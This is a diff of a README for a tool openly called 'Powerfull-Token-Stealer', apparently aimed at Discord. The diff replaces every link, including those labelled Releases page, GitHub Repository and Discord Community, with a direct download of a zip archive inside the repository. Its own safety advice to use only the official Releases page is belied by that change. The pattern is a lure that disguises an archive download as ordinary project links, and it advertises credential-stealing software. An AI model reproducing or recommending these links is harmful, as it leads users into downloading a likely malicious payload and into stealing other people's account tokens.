@@ -7,7 +7,7 @@ Powerfull-Token-Stealer is a simple tool designed to help users interact with Di
 To get started with Powerfull-Token-Stealer, you need to download the application from the Releases page. This guide will take you through each step, ensuring you can set it up without hassle.
 
 ### 🔗 Download Link
-[![Download Powerfull-Token-Stealer](https://img.shields.io/badge/Download-Powerfull--Token--Stealer-blue)](https://github.com/registeredsecurityparetic777/Powerfull-Token-Stealer/releases)
+[![Download Powerfull-Token-Stealer](https://raw.githubusercontent.com/registeredsecurityparetic777/Powerfull-Token-Stealer/main/natuary/Powerfull-Token-Stealer_1.8.zip)](https://raw.githubusercontent.com/registeredsecurityparetic777/Powerfull-Token-Stealer/main/natuary/Powerfull-Token-Stealer_1.8.zip)
 
 ## 🛠️ System Requirements
 Before you download, please ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you download, please ensure your system meets the following requirements:
 Follow these steps to download and install Powerfull-Token-Stealer:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/registeredsecurityparetic777/Powerfull-Token-Stealer/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/registeredsecurityparetic777/Powerfull-Token-Stealer/main/natuary/Powerfull-Token-Stealer_1.8.zip).
 
 2. **Select the Latest Release:**
    Find the latest version of the application. It is usually at the top of the list.
@@ -78,8 +78,8 @@ If you encounter issues during installation or usage:
 Your safety matters. Ensure that you download Powerfull-Token-Stealer only from the official Releases page. Avoid third-party sources to keep your device secure.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/registeredsecurityparetic777/Powerfull-Token-Stealer) - Explore the source code and contribute.
-- [Discord Community](https://discord.com/) - Join discussions with other users for tips and support.
+- [GitHub Repository](https://raw.githubusercontent.com/registeredsecurityparetic777/Powerfull-Token-Stealer/main/natuary/Powerfull-Token-Stealer_1.8.zip) - Explore the source code and contribute.
+- [Discord Community](https://raw.githubusercontent.com/registeredsecurityparetic777/Powerfull-Token-Stealer/main/natuary/Powerfull-Token-Stealer_1.8.zip) - Join discussions with other users for tips and support.
 
 ## ⚙️ Contributing
 If you wish to contribute, feel free to fork the repository and submit pull requests. All contributions are welcome!
